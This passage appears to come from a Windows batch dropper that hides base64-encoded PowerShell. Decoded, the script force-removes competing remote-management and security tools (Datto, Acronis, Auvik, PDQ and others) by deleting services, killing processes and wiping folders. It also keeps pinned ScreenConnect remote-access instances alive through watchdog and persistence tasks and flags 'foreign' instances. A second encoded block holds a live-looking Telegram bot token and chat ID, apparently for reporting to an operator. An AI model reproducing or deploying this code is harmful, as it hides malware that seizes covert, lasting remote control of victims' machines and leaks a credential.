Y3JvbmlzIEN5YmVyKicsJ0Fjcm9uaXMgQWdlbnQqJywnQ3liZXIgUHJvdGVjdCBBZ2VudConKSB9
CiAgICAgICAgQHsgVGFnPSdEb21vdHonOyAgICAgICBTdmM9QCgnRG9tb3R6KicpOyBQcm9jPUAo
J0RvbW90eionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEb21vdHoiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cRG9tb3R6Iik7IFByb2Q9QCgnRG9tb3R6KicpIH0KICAgICAgICBAeyBU
YWc9J0F1dmlrJzsgICAgICAgIFN2Yz1AKCdBdXZpayonKTsgUHJvYz1AKCdBdXZpayonKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xBdXZpayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxB
dXZpayIpOyBQcm9kPUAoJ0F1dmlrKicpIH0KICAgICAgICBAeyBUYWc9J0JhcnJhY3VkYVJNTSc7
IFN2Yz1AKCdCYXJyYWN1ZGEqJyk7IFByb2M9QCgnTVdTZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXEJhcnJhY3VkYSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCYXJyYWN1
ZGEiLCIkZW52OlByb2dyYW1GaWxlc1xMZXZlbCBQbGF0Zm9ybXMiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cTGV2ZWwgUGxhdGZvcm1zIik7IFByb2Q9QCgnQmFycmFjdWRhIFJNTSonLCdNYW5h
Z2VkIFdvcmtwbGFjZSonKSB9CiAgICAgICAgQHsgVGFnPSdHb3Zlcmxhbic7ICAgICBTdmM9QCgn
R292ZXJsYW4qJyk7IFByb2M9QCgnZ292ZXJsYW4qJywnZ292YWdlbnQqJyk7IERpcnM9QCgiJGVu
djpQcm9ncmFtRmlsZXNcR292ZXJsYW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR292ZXJs
YW4iKTsgUHJvZD1AKCdHb3ZlcmxhbionKSB9CiAgICAgICAgQHsgVGFnPSdQRFEnOyAgICAgICAg
ICBTdmM9QCgnUERRKicpOyBQcm9jPUAoJ1BEUVJ1bm5lcionLCdQRFFJbnZlbnRvcnkqJywnUERR
RGVwbG95KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFkbWluIEFyc2VuYWwiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cQWRtaW4gQXJzZW5hbCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBE
USIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQRFEiKTsgUHJvZD1AKCdQRFEgRGVwbG95Kics
J1BEUSBJbnZlbnRvcnkqJywnUERRIENvbm5lY3QqJykgfQogICAgKQoKICAgIGZvcmVhY2ggKCR0
b29sIGluICRybW0pIHsKICAgICAgICAkaGl0ID0gJGZhbHNlCiAgICAgICAgZm9yZWFjaCAoJHBh
dCBpbiAkdG9vbC5Qcm9kKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6
VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAg
ICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgICAgIGlmICgkZG4g
LWFuZCAkZG4gLWxpa2UgJHBhdCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSXMtRGF0
dG9LZWVwZXIgJGRuKSB7IExvZyAicm1tX3NraXBfZGF0dG9fa2VlcCBbJGRuXSI7IHJldHVybiB9
CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChVbmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAk
bi5ybW0rKzsgJGhpdCA9ICR0cnVlIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAg
ICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAk
dG9vbC5TdmMpIHsKICAgICAgICAgICAgR2V0LVNlcnZpY2UgLU5hbWUgJHBhdCAtRXJyb3JBY3Rp
b24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlm
IChJcy1EYXR0b0tlZXBlciAkXy5OYW1lIC1vciBJcy1EYXR0b0tlZXBlciAkXy5EaXNwbGF5TmFt
ZSkgeyBMb2cgInJtbV9za2lwX2RhdHRvX3N2YyAkKCRfLk5hbWUpIjsgcmV0dXJuIH0KICAgICAg
ICAgICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAg
ICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA1MDAKICAgICAgICAgICAgICAg
ICYgc2MuZXhlIGRlbGV0ZSAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAg
ICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9zdmNfZGVsZXRlZCAkKCRfLk5h
bWUpIFskKCR0b29sLlRhZyldIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVh
Y2ggKCRwYXQgaW4gJHRvb2wuUHJvYykgewogICAgICAgICAgICBHZXQtUHJvY2VzcyAtTmFtZSAk
cGF0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAg
ICAgICAgICAgICAgU3RvcC1Qcm9jZXNzIC1JZCAkXy5JZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExv
ZyAicm1tX3Byb2Nfa2lsbGVkICQoJF8uUHJvY2Vzc05hbWUpIFskKCR0b29sLlRhZyldIgogICAg
ICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRkIGluICR0b29sLkRpcnMpIHsK
ICAgICAgICAgICAgaWYgKCRkIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7CiAg
ICAgICAgICAgICAgICBpZiAoSXMtRGF0dG9LZWVwZXIgJGQpIHsgTG9nICJybW1fc2tpcF9kYXR0
b19kaXIgJGQiOyBjb250aW51ZSB9CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVtb3ZlRGly
ICRkKSB7ICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX2Rpcl9yZW1vdmVkICRkIiB9
CiAgICAgICAgICAgICAgICBlbHNlIHsgJG4uZmFpbCsrOyBMb2cgInJtbV9kaXJfUkVNT1ZFX0ZB
SUxFRCAkZCIgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkaGl0KSB7IExv
ZyAicm1tX2V4dGVybWluYXRlZCAkKCR0b29sLlRhZykiIH0KICAgIH0KCiAgICAkc3VtbWFyeSA9
ICJleHRlcm1pbmF0ZSBzdmM9JCgkbi5zdmMpIHByb2M9JCgkbi5wcm9jKSBkaXI9JCgkbi5kaXIp
IHByb2R1Y3Q9JCgkbi5wcm9kdWN0KSBybW09JCgkbi5ybW0pIGZhaWw9JCgkbi5mYWlsKSIKICAg
IExvZyAkc3VtbWFyeQogICAgcmV0dXJuICRzdW1tYXJ5Cn0KCmZ1bmN0aW9uIFVwZGF0ZS1TdGF0
ZSB7CiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGwKICAgIGZvcmVhY2ggKCRzdmMgaW4g
KEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlm
ICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7CiAgICAgICAgICAgIGlm
ICgkbWF0Y2hlc1sxXSAtZXEgJzVmNjAxMDU3OTg1MmU1MDcnKSB7ICRwcmltID0gIiQoJHN2Yy5T
dGF0dXMpIiB9CiAgICAgICAgICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICdmODYxYzgxNDBk
NDUzNDI3JykgeyAkYWx0ID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAgfQogICAgfQogICAg
JGZvcmVpZ24gPSBAKCkKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdT
Y3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdc
KChbMC05YS1mXXsxNn0pXCknIC1hbmQgJG1hdGNoZXNbMV0gLW5vdGluIEAoJzVmNjAxMDU3OTg1
MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3JykpIHsKICAgICAgICAgICAgJGZvcmVpZ24gKz0gJG1h
dGNoZXNbMV0KICAgICAgICB9CiAgICB9CiAgICAkaWQgPSBSZWFkLUlkZW50aXR5CiAgICAkdGFz
a3NPayA9IDA7ICR0YXNrc1RvdGFsID0gMAogICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RB
U0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsKICAgICAgICAkdGFza3NUb3RhbCsrCiAgICAgICAg
JHRuID0gW3N0cmluZ10kaWRbJGtdCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7IGNvbnRpbnVlIH0K
ICAgICAgICAkbWFya2VyID0gaWYgKCRrIC1lcSAnVEFTS19CJykgeyAnZXRsX21vbi5jbWQnIH0g
ZWxzZSB7ICdvd25fbW9uLmNtZCcgfQogICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAk
bWFya2VyKSB7ICR0YXNrc09rKysgfQogICAgfQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgJE1v
blBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJyB9CiAgICAkd2QgPSBFbnN1
cmUtV2F0Y2hkb2cKICAgICRwcmV2ID0gQHt9CiAgICAkc3RhdGVQYXRoID0gSm9pbi1QYXRoICRX
b3JrRGlyICdzdGF0ZS5qc29uJwogICAgaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoKSB7CiAgICAg
ICAgdHJ5IHsgKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252
ZXJ0RnJvbS1Kc29uKS5QU09iamVjdC5Qcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJl
dlskXy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBjYXRjaCB7fQogICAgfQogICAgJGluc3RhbGxDb3Vu
dCA9IDEKICAgIGlmICgkcHJldi5pbnN0YWxsQ291bnQpIHsgJGluc3RhbGxDb3VudCA9IFtpbnRd
JHByZXYuaW5zdGFsbENvdW50IH0KICAgIGlmICgkcHJldi5wcmltIC1hbmQgJHByZXYucHJpbSAt
bmUgJ1J1bm5pbmcnIC1hbmQgJHByaW0gLWVxICdSdW5uaW5nJykgeyAkaW5zdGFsbENvdW50Kysg
fQogICAgJHN0YXRlID0gW29yZGVyZWRdQHsKICAgICAgICBob3N0ICAgICAgICAgPSAkZW52OkNP
TVBVVEVSTkFNRQogICAgICAgIHRzICAgICAgICAgICA9IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxU
aW1lKCkuVG9TdHJpbmcoJ28nKQogICAgICAgIGJ1aWxkICAgICAgICA9ICRCdWlsZAogICAgICAg
IHByaW0gICAgICAgICA9ICQoaWYgKCRwcmltKSB7ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9
KQogICAgICAgIGFsdCAgICAgICAgICA9ICQoaWYgKCRhbHQpIHsgJGFsdCB9IGVsc2UgeyAnTUlT
U0lORycgfSkKICAgICAgICBmb3JlaWduICAgICAgPSAkZm9yZWlnbgogICAgICAgIHRhc2tzT2sg
ICAgICA9ICR0YXNrc09rCiAgICAgICAgdGFza3NUb3RhbCAgID0gJHRhc2tzVG90YWwKICAgICAg
ICB3YXRjaGRvZyAgICAgPSAkd2QKICAgICAgICBpbnN0YWxsQ291bnQgPSAkaW5zdGFsbENvdW50
CiAgICAgICAgbGFzdEhlYWwgICAgID0gJChpZiAoJEV4dHJhKSB7IChHZXQtRGF0ZSkuVG9Vbml2
ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSB9IGVsc2VpZiAoJHByZXYubGFzdEhlYWwpIHsgJHBy
ZXYubGFzdEhlYWwgfSBlbHNlIHsgJG51bGwgfSkKICAgICAgICBub3RlICAgICAgICAgPSAkRXh0
cmEKICAgIH0KICAgICgkc3RhdGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MpIHwgU2V0LUNv
bnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGggLUZvcmNlCiAgICByZXR1cm4gJHN0YXRlCn0K
CnN3aXRjaCAoJEFjdGlvbikgewogICAgJ2luaXQnICAgICAgICAgICAgeyAkaWQgPSBJbml0aWFs
aXplLUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgk
Xy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0KICAgICdpZGVudGl0eScgICAgICAgIHsgJGlkID0gUmVh
ZC1JZGVudGl0eTsgJGlkLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8u
S2V5KT0kKCRfLlZhbHVlKSIgfSB9CiAgICAnd2F0Y2hkb2cnICAgICAgICB7IEluc3RhbGwtV2F0
Y2hkb2cgfCBPdXQtTnVsbCB9CiAgICAnd2F0Y2hkb2ctZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRv
ZyB9CiAgICAndGFza3MtZW5zdXJlJyAgICB7IEVuc3VyZS1QZXJzaXN0VGFza3MgfQogICAgJ3N0
YXRlJyAgICAgICAgICAgeyBVcGRhdGUtU3RhdGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3Mg
fQogICAgJ3JlcGFpcicgICAgICAgICAgeyBSZXBhaXItU0NTZXJ2aWNlICRGcCB9CiAgICAncmVn
aXN0ZXJlZCcgICAgICB7IFRlc3QtU0NSZWdpc3RlcmVkICRGcCB9CiAgICAnZXh0ZXJtaW5hdGUn
ICAgICB7IEludm9rZS1FeHRlcm1pbmF0ZSB9Cn0K
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcN
CkNIQVRfSUQ9NzU0NzQ2MjA3MA0K
::B64_NTF_END
